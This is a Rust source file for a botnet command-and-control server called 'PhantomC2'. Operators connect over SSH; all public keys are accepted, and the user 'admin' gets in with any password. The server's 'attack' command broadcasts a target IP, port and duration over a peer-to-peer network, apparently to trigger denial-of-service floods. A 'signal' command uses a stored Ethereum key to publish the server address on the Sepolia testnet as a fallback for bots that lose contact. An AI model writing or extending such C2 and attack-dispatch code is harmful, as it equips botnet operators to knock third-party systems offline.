use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::path::PathBuf;
use async_trait::async_trait;
use russh::{server, Channel, ChannelId, CryptoVec};
use russh_keys::key;
use log::{info, error};
use crate::p2p::P2PService;

// Shared State for the C2
pub struct ServerState {
    pub clients: HashMap<ChannelId, usize>, // Just tracking IDs for now
}

#[derive(Clone)]
pub struct PhantomServer {
    pub state: Arc<Mutex<ServerState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
}

impl PhantomServer {
    pub fn new(master_key: Arc<ed25519_dalek::SigningKey>, p2p_service: Arc<P2PService>, keys_dir: PathBuf) -> Self {
        Self {
            state: Arc::new(Mutex::new(ServerState { clients: HashMap::new() })),
            master_key,
            p2p_service,
            keys_dir,
        }
    }
}

pub struct PhantomSession {
    pub state: Arc<Mutex<ServerState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
}

#[async_trait]
impl server::Handler for PhantomSession {
    type Error = anyhow::Error;

    // Correct Signature: self (owned), channel (owned), session (owned) -> Result<(Self, bool, Session)>
    async fn channel_open_session(
        self,
        _channel: Channel<server::Msg>,
        session: server::Session,
    ) -> Result<(Self, bool, server::Session), Self::Error> {
        info!("SSH Session Opened!");
        Ok((self, true, session))
    }

    async fn auth_publickey(
        self,
        user: &str,
        _public_key: &key::PublicKey,
    ) -> Result<(Self, server::Auth), Self::Error> {
        info!("Auth Public Key: {}", user);
        // Accept all for prototype
        Ok((self, server::Auth::Accept))
    }

    async fn auth_password(
        self,
        user: &str,
        _password: &str,
    ) -> Result<(Self, server::Auth), Self::Error> {
        info!("Auth Password: {}", user);
         if user == "admin" {
             Ok((self, server::Auth::Accept))
         } else {
             // For simplicity in prototype, accept anyway or reject logging.
             // Usually returns Auth::Reject { proceed_with_methods: None }
             Ok((self, server::Auth::Reject { proceed_with_methods: None }))
         }
    }

    async fn data(
        self,
        channel: ChannelId,
        data: &[u8],
        mut session: server::Session,
    ) -> Result<(Self, server::Session), Self::Error> {
        let text = String::from_utf8_lossy(data);
        // We need to act on the session here.
        // Logic similar to previous, but session is owned mutably inside the scope?
        // Wait, argument is `mut session: Session`.
        
        let cmd = text.trim();
        if !cmd.is_empty() {
             info!("Example C2 Command: {}", cmd);
             let response = format!("PhantomC2> Received: {}\r\n", cmd);
             session.data(channel, CryptoVec::from_slice(response.as_bytes()));
                          if cmd == "help" {
                   session.data(channel, CryptoVec::from_slice(b"Available: attack <ip> <port> <duration>, signal <ip:port>\r\n"));
              } else if cmd.starts_with("attack ") {
                   // Parse: attack 1.2.3.4 80 60
                   let parts: Vec<&str> = cmd.split_whitespace().collect();
                   if parts.len() >= 4 {
                       let target_ip: std::net::Ipv4Addr = parts[1].parse().unwrap_or(std::net::Ipv4Addr::new(0,0,0,0));
                       let port: u16 = parts[2].parse().unwrap_or(0);
                       let duration: u32 = parts[3].parse().unwrap_or(0);
                       
                       // Construct Payload: [Type(1)] [IP(4)] [Port(2)] [Duration(4)]
                       let mut payload = Vec::new();
                       payload.push(1); // Attack Type 1 (Generic UDP/Syn?)
                       payload.extend_from_slice(&u32::from(target_ip).to_be_bytes()); // Network Order
                       payload.extend_from_slice(&port.to_be_bytes());
                       payload.extend_from_slice(&duration.to_be_bytes());
                       
                       self.p2p_service.broadcast_command(payload).await;
                       
                       session.data(channel, CryptoVec::from_slice(b"[+] Global Attack Broadcasted!\r\n"));
                       info!("Broadcasting Attack on {}", target_ip);
                   } else {
                       session.data(channel, CryptoVec::from_slice(b"Usage: attack <ip> <port> <duration>\r\n"));
                   }
              } else if cmd.starts_with("signal ") {
                   // Parse: signal 1.2.3.4:31337
                   // This broadcasts the IP to Sepolia for Edge fallback recovery
                   let parts: Vec<&str> = cmd.split_whitespace().collect();
                   if parts.len() >= 2 {
                       let ip_port = parts[1];
                       session.data(channel, CryptoVec::from_slice(format!("[*] Broadcasting '{}' to Sepolia...\r\n", ip_port).as_bytes()));
                       
                       // Read ETH Key from keys directory
                       let eth_key_path = self.keys_dir.join("phantom_eth.key");
                       let mut eth_key = std::fs::read_to_string(&eth_key_path)
                           .unwrap_or_default()
                           .trim()
                           .to_string();
                       
                       // Auto-add 0x prefix if missing
                       if !eth_key.starts_with("0x") && !eth_key.is_empty() {
                           eth_key = format!("0x{}", eth_key);
                       }
                       
                       if eth_key.is_empty() || eth_key == "0x" {
                           session.data(channel, CryptoVec::from_slice(b"[-] ETH_KEY not configured! Set env or keys/eth.key\\r\\n"));
                       } else {
                           let payload = ip_port.as_bytes().to_vec();
                           match crate::eth_broadcaster::broadcast_signal(&eth_key, payload).await {
                               Ok(tx_hash) => {
                                   session.data(channel, CryptoVec::from_slice(format!("[+] Sepolia Signal Sent! {}\r\n", tx_hash).as_bytes()));
                               }
                               Err(e) => {
                                   session.data(channel, CryptoVec::from_slice(format!("[-] Sepolia Signal Failed: {}\r\n", e).as_bytes()));
                               }
                           }
                       }
                   } else {
                       session.data(channel, CryptoVec::from_slice(b"Usage: signal <ip:port>\r\n"));
                   }
              }
              
              session.data(channel, CryptoVec::from_slice(b"PhantomC2$ "));
        }
        
        Ok((self, session))
    }
}
